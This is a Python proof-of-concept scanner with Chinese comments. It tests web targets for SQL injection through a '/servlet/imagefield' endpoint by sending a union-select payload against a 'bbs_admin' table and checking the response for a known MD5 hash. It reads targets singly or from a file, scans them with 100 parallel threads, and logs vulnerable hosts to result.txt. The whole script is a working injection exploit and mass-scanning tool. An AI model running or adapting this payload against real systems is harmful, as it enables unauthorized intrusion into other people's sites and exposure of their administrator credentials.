import requests
import argparse
import sys
from multiprocessing.dummy import Pool

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

# 定义请求头，模拟浏览器访问
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive"
}

# 定义漏洞利用函数poc，接收一个目标URL参数target
def poc(target):
    # 构造具体的目标URL路径和SQL注入payload
    url_payload = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','1'))--"
    url = target + url_payload
    
    # 发送第一个GET请求，检查目标是否可达
    res1 = requests.get(url=target, verify=False)
    
    # 如果第一个请求返回状态码为200
    if res1.status_code == 200:
        # 发送第二个GET请求，尝试进行SQL注入攻击
        res2 = requests.get(url=url, headers=headers, verify=False)
        
        # 如果返回结果中包含指定的MD5哈希值，认为存在SQL注入漏洞
        if 'c4ca4238a0b923820dcc509a6f75849b' in res2.text:
            print('\033[1;31;40m', end="")  # 打印红色提示文字
            print(f'[+]{target}存在SQL注入', end="")
            print('\033[0m')  # 恢复默认终端颜色
            # 将有漏洞的URL写入result.txt文件中
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
        else:
            print(f'[-]{target}不存在SQL注入')
    else:
        # 如果第一个请求的状态码不为200，可能存在网络或目标问题，建议手工测试
        print(f'[-]{target}可能存在问题，请手工测试')

# 主函数，处理命令行参数和执行漏洞扫描
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='url', type=str, help='目标URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='包含目标URL的文件路径')
    args = parser.parse_args()
    
    # 如果指定了URL参数而没有指定文件参数，则直接执行单个目标的漏洞扫描
    if args.url and not args.file:
        poc(args.url)
    # 如果指定了文件参数而没有指定URL参数，则从文件中读取目标URL列表进行批量漏洞扫描
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for line in fp.readlines():
                url_list.append(line.strip())
        
        # 使用线程池并行处理URL列表，最多并发100个线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        # 如果参数不合法或未提供足够的参数，打印使用说明
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 确保在主程序中执行main函数
if __name__ == '__main__':
    main()
